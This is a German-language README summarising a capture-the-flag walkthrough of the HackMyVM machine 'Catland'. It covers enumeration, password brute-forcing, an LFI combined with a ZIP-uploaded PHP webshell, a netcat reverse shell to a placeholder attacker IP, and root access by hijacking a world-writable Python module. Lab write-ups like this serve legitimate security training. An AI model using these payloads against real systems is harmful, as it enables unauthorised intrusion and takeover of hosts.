# Catland - HackMyVM Lösungsweg

![Catland VM Icon](Catland.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Catland".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Catland
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Mittel (Medium)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Catland](https://hackmyvm.eu/machines/machine.php?vm=Catland)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Catland_HackMyVM_Medium/](https://alientec1908.github.io/Catland_HackMyVM_Medium/)
*   **Datum des Originalberichts:** 10. April 2023

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `exiftool`
*   `steghide`
*   `stegsnow`
*   `stegseek`
*   `wfuzz`
*   `nikto`
*   `vi` / `nano`
*   `curl`
*   `cupp`
*   `hydra`
*   `cat`
*   `cp`
*   `zip` (impliziert)
*   `nc` (netcat)
*   `python3`
*   `stty`
*   `sudo`
*   `find`
*   `ss`
*   `mysql` (Client)
*   `grep`
*   `john` (John the Ripper)
*   `ssh`

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.126` wurde mittels `arp-scan -l` identifiziert.
*   Der Hostname `catland.hmv` wurde der IP `192.168.2.126` in der `/etc/hosts`-Datei des Angreifers zugeordnet (impliziert).
*   Ein `nmap`-Scan ergab offene Ports:
    *   **Port 22/tcp (SSH):** OpenSSH 8.4p1 Debian 5+deb11u1.
    *   **Port 80/tcp (HTTP):** Apache httpd 2.4.54 ((Debian)). Titel der Seite: "Catland".

### 2. Web Enumeration

*   `gobuster` fand `index.php`, Bilddateien (`logo.jpeg`, `logo.png`), das Verzeichnis `/images` und `gallery.php`.
*   Steganographie-Versuche auf `logo.jpeg` und `laura-with-cat.jpeg` (gefunden im `/images`-Verzeichnis) mit `exiftool`, `steghide`, `stegsnow`, `stegseek` waren erfolglos.
*   `wfuzz` zur Parameter-Fuzzing auf `index.php` und `gallery.php` brachte keine direkten Ergebnisse.
*   `nikto` fand fehlende Security-Header und Verzeichnisauflistung für `/images/`.
*   **Subdomain Enumeration mit `wfuzz`:**
    *   Der Host-Header wurde gefuzzt (`Host: FUZZ.catland.hmv`).
    *   Die Subdomain **`admin.catland.hmv`** wurde entdeckt.
*   **Admin Panel Enumeration (`admin.catland.hmv`):**
    *   Die Subdomain wurde zur `/etc/hosts`-Datei hinzugefügt.
    *   `curl http://admin.catland.hmv/` zeigte ein Login-Formular. Ein `redirect.js` versuchte, nicht eingeloggte Benutzer umzuleiten.
    *   `curl http://admin.catland.hmv/index.phps` (Versuch, Quellcode zu lesen) schlug fehl (403).

### 3. Initial Access als `www-data`

1.  **Benutzername `laura` gefunden:**
    *   Basierend auf dem Dateinamen `laura-with-cat.jpeg` wurde der Benutzername `laura` vermutet.
    *   `cupp -i` wurde verwendet, um eine Passwortliste (`laura.txt`) basierend auf dem Namen "laura" zu erstellen.
2.  **Passwort für `laura` im Admin-Panel gefunden:**
    *   `hydra` wurde gegen das Login-Formular auf `admin.catland.hmv` mit dem Benutzer `laura` und der Liste `laura.txt` eingesetzt.
    *   Das Passwort **`Laura_2008`** wurde gefunden.
3.  **LFI-Schwachstelle und ZIP-Upload:**
    *   Nach dem Login als `laura:Laura_2008` wurde eine Upload-Funktion (`/upload.php`) entdeckt, die nur ZIP- oder RAR-Dateien akzeptierte.
    *   Auf der Seite `/user.php` wurde eine **Local File Inclusion (LFI)**-Schwachstelle im `page`-Parameter entdeckt (`user.php?page=/etc/passwd` zeigte den Inhalt).
4.  **Remote Code Execution (RCE) via LFI und ZIP-Upload:**
    *   Eine einfache PHP-Webshell (`<?php system($_GET['cmd']); ?>`) wurde erstellt (`shell.php`) und in eine ZIP-Datei (`shell.zip`) gepackt.
    *   Die `shell.zip` wurde über `/upload.php` hochgeladen (vermutlich in ein Verzeichnis wie `./uploads/`).
    *   Die LFI wurde genutzt, um die Shell innerhalb der ZIP auszuführen (PHP kann ZIP-Dateien über Wrapper wie `phar://` interpretieren, oder es gab eine serverseitige Verarbeitung):
        `http://admin.catland.hmv/user.php?page=./uploads/shell.zip&cmd=ls` zeigte bereits eine Befehlsausgabe.
5.  **Reverse Shell als `www-data`:**
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet.
    *   Über die LFI-RCE wurde ein Netcat-Reverse-Shell-Befehl ausgeführt:
        `http://admin.catland.hmv/user.php?page=./uploads/shell.zip&cmd=nc%20-e%20/bin/bash%20ANGREIFER_IP%209001`
    *   Shell als `www-data` auf `catland` wurde erlangt und stabilisiert.

### 4. Privilege Escalation

1.  **Enumeration als `www-data`:**
    *   `sudo -l` erforderte ein Passwort. Standard-SUID-Dateien wurden gefunden.
    *   MySQL lief lokal auf Port 3306.
    *   Die Datei `/var/www/admin/config.php` enthielt Datenbank-Credentials: `admin:catlandpassword123` für die Datenbank `catland`.
    *   Login in die MySQL-Datenbank `catland` mit diesen Credentials.
    *   Die Tabelle `users` bestätigte `laura:Laura_2008`. Die Tabelle `comment` enthielt den Hinweis: "change grub password".
    *   Die GRUB-Konfigurationsdatei (`/boot/grub/grub.cfg`) enthielt einen PBKDF2-Passwort-Hash für `root`:
        `grub.pbkdf2.sha512.10000.CAEB...`
2.  **GRUB-Hash knacken und SSH-Login als `laura`:**
    *   Der GRUB-Hash wurde offline mit `john --wordlist=/usr/share/wordlists/rockyou.txt` geknackt. Das Passwort war **`berbatov`**.
    *   Dieses Passwort wurde erfolgreich für den SSH-Login des Benutzers `laura` verwendet: `ssh laura@catland.hmv`.
3.  **Enumeration als `laura`:**
    *   Die `user.txt` wurde im Home-Verzeichnis von `laura` gefunden und gelesen.
    *   `sudo -l` für `laura` zeigte: `(ALL : ALL) NOPASSWD: /usr/bin/rtv --help`.
    *   Das Skript `/usr/bin/rtv` (Python3) importierte `importlib.metadata`.
    *   Die Datei `/usr/lib/python3.9/importlib/metadata.py` war **für alle Benutzer schreibbar (`-rw-r--rw-`)**.
4.  **Privilege Escalation zu `root` via Python Import Hijacking:**
    *   Die Datei `/usr/lib/python3.9/importlib/metadata.py` wurde bearbeitet und der Code `import os; os.system('/bin/bash -i')` hinzugefügt.
    *   Der erlaubte `sudo`-Befehl wurde ausgeführt: `sudo rtv --help`.
    *   Da `rtv` die modifizierte `metadata.py` importierte, wurde der eingefügte Code mit Root-Rechten ausgeführt.
    *   Eine interaktive Root-Shell wurde erhalten.

### 5. Flags

*   **User-Flag (`/home/laura/user.txt`):**
    ```
    933ff8025e8944b6b3b797b2f006b2c0
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    ca555fc5afb4475bb0878d2b1a76cbe9
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Catland" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
